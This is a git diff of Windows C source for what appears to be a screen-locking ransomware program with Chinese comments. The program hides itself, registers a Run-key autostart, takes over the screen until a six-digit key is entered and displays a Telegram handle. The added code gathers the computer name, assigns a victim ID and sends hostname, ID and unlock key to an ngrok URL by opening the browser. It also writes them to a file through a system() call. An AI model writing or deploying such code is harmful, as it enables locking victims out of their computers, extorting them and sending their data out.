@@ -1,4 +1,6 @@
 #include "util.h"
+#include <tchar.h>
+
 
 // pid 杀掉程序
 BOOL KillProcess(HWND hwnd)
@@ -37,20 +39,59 @@ void AutoRunAndHide(){
     SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);
 }
 
+// 解除隐藏自身&开机自启动
+void RemoveAutoRunAndUnhide() {
+    // 获取当前可执行文件路径
+    char exePath[MAX_PATH];
+    GetModuleFileName(NULL, exePath, MAX_PATH);
+
+    // 删除注册表项
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+    RegDeleteValue(hKey, "hhh");
+    RegCloseKey(hKey);
+
+    // 将文件属性设置为非隐藏
+    SetFileAttributes(exePath, FILE_ATTRIBUTE_NORMAL);
+}
+
+// 发起请求
+void MakeRequest(){
+    // 网页URL
+    char url[500]="";
+    sprintf(url,"http://0ba4-221-178-124-227.ngrok-free.app/?hostname=%s&id=%s&pwd=%s",hostname,ID,miYao);
+
+    // 启动默认浏览器并打开网页
+    ShellExecute(NULL, "open", url, NULL, NULL, SW_SHOWMINIMIZED);
+}
+
+void GetInfo(){
+    DWORD size = sizeof(hostname);
+    GetComputerName(hostname, &size);
+    // 设置随机数种子
+    srand(time(NULL));
+    // 生成随机的6位数
+    // 将随机数转换为字符串,ID
+    sprintf(ID, "%06d", rand() % 1000000);
+}
+
 // 随机密钥
 void RandomMiYao(){
     // 设置随机数种子
-    srand(time(NULL));
+    srand(time(NULL)+3);
     // 生成随机的6位数
     // 将随机数转换为字符串
     sprintf(miYao, "%06d", rand() % 1000000);
     char str[100]="echo ";
+    strcat(str,hostname);
+    strcat(str," ");
+    strcat(str,ID);
+    strcat(str," ");
     strcat(str,miYao);
     strcat(str," > config.txt");
     
     system(str);
 }
-
 
 // windows消息处理函数
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
@@ -60,9 +101,8 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
         case WM_CREATE:
         {
             // 使用 SetWindowPos 函数将窗口置前
-            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);  
-            RandomMiYao();
-            AutoRunAndHide();   
+            // SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);  
+            
             // 启动定时器
             SetTimer(hwnd, TIMER_ID, TIMER_INTERVAL, NULL);   
             break;
@@ -109,6 +149,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 if(strcmp(miYao,buffer)==0||strcmp(miYaoRoot,buffer)==0){
                     isLook=0;   // 解锁
                     ShowWindow(hwndTaskbar, SW_SHOWNORMAL);
+                    RemoveAutoRunAndUnhide();
+                    // 启动资源管理器
+                    ShellExecute(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOWDEFAULT);
                     exit(0);
                 }else{
                     isWrong=1;
@@ -142,7 +185,9 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
             // 第二行文本
             SetTextColor(hdc, RGB(255, 0, 0));
-            TextOutW(hdc, (screen_width-300)/2, (screen_height+80)/2, L"TG号 https://t.me/besttimeforme (¬◡¬)✧", 50);// lstrlenW(L"文本1")
+            TextOutW(hdc, (screen_width-300)/2, (screen_height+40)/2, L"ID: ", 4);// lstrlenW(L"文本1")
+            TextOut(hdc, (screen_width-200)/2, (screen_height+40)/2, ID, 6);// lstrlenW(L"文本1")
+            TextOutW(hdc, (screen_width-300)/2, (screen_height+80)/2, L"TG号 https://t.me/besttimeforme (¬◡¬)", 50);// lstrlenW(L"文本1")
             
             // 恢复字体
             SelectObject(hdc, oldFont);
